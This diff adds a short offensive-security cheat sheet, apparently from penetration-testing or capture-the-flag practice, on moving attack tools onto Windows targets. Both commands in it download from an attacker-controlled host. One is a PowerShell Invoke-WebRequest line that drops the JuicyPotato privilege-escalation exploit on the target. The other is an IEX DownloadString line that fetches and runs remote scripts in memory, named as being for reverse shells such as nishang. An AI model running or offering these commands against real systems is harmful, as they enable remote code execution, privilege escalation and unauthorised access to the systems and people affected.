@@ -1,0 +1,16 @@
+File Transfer Methodology.
+
+Windows
+
+1.  File transfer - use below command, double check filepath and case sensitive 
+typo or spelling mistakes. 
+
+Use it for deploying payload and exploit like .exe and juicypotatoes.
+
+ powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/JuicyPotato.exe -outFile C:\Users\kohsuke\Desktop\JP.exe"
+
+2.  To execute a powsershell script like sherlock.ps1, or nishang-reverseshell.ps1
+use below command. Don't use deploy command above for ps1 scripts, 
+it wont work
+
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.90:8000/shell.ps1')"
